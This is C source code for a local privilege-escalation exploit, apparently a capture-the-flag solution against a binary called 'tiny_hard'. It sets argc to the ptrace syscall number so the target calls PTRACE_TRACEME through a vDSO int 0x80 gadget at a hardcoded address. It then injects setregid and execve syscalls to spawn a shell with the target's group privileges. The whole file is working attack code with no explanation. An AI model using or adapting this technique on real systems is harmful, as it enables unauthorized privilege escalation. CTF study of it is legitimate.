#undef __x86_64__
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define BIN_PATH "/home/tiny_hard/tiny_hard"

#define VDSO_BASE (0xf773b000L)

// "sym\0" at VDSO, ln -sf /bin/sh sym
const uint32_t ADDR_STR = VDSO_BASE + 0xbe9L;
const uint32_t ADDR_INT80 = VDSO_BASE + 0xb57L;
const uint32_t DUMMY = 0;

// make argc==26, the syscall number of ptrace, and ebx==0, so it's equivalent to PTRACE_TRACEME
const char* _argv[] = {(char*)&ADDR_INT80, "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", 0};

int wait_child(pid_t pid) {
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        printf("child[%d] terminated  normally.\n", pid);
        return 1;
    } else if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        printf("chidl[%d] was terminated by the signal[%d], %s\n", pid, sig, strsignal(sig));
        return 2;
    } else if (WIFSTOPPED(status)) {
        int sig = WSTOPSIG(status);
        printf("child[%d] was stopped by delivery of the signal[%d], %s\n", pid, sig, strsignal(sig));
        return 0;
    }
    return -1;
}

int pt_syscall(pid_t pid, int sysno, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {
    struct user_regs_struct regs = {0};
    if (0 > ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
        perror("PTRACE_GETREGS failed");
        exit(-1);
    }
    regs.eax = sysno;
    regs.ebx = arg0;
    regs.ecx = arg1;
    regs.edx = arg2;
    regs.esi = arg3;
    regs.edi = arg4;
    regs.ebp = arg5;
    regs.eip = ADDR_INT80;
    if (0 > ptrace(PTRACE_SETREGS, pid, 0, &regs)) {
        perror("PTRACE_SETREGS failed.");
        exit(-1);
    }
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
    wait_child(pid);
    if (0 > ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
        perror("PTRACE_GETREGS failed");
        exit(-1);
    }
    printf("eip:%#lx, eax:%#lx\n", regs.eip, regs.eax);
    return regs.eax;
}

void pt_execve(pid_t pid) {
    puts("execve");
    pt_syscall(pid, SYS_execve, ADDR_STR, _argv, 0, 0, 0, 0);
}

void pt_setregid(pid_t pid, int rgid, int egid) {
    puts("setregid");
    pt_syscall(pid, SYS_setregid, rgid, egid, 0, 0, 0, 0);
}

int pt_getgid(pid_t pid) {
    puts("getgid");
    return pt_syscall(pid, SYS_getgid, 0, 0, 0, 0, 0, 0);
}

int pt_getegid(pid_t pid) {
    puts("getegid");
    return pt_syscall(pid, SYS_getegid, 0, 0, 0, 0, 0, 0);
}

void show_gids(pid_t pid) {
    int gid = pt_getgid(pid);
    int egid = pt_getegid(pid);
    printf("gid:%d, egid:%d\n", gid, egid);
}

int main(int argc, char** argv, char** envp) {
    struct user_regs_struct regs = {0};

    while (1) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork failed.");
            exit(-1);
        } else if (pid) {
            if (wait_child(pid)) {
                continue;
            }
            if (0 > ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
                perror("PTRACE_GETREGS failed.");
                continue;
            }
            printf("eip:%#lx, eax:%#lx\n", regs.eip, regs.eax);
            pt_setregid(pid, 1085, 1085);
            show_gids(pid);
            pt_execve(pid);
            if (0 > ptrace(PTRACE_DETACH, pid, 0, &regs)) {
                perror("PTRACE_DETACH failed.");
                continue;
            }
            // if (wait_child(pid))
            wait_child(pid);
            puts("Enjoy Now~");
            exit(0);
        } else {
            execve(BIN_PATH, _argv, 0);
            perror("execve failed");
        }
    }
    return 0;
}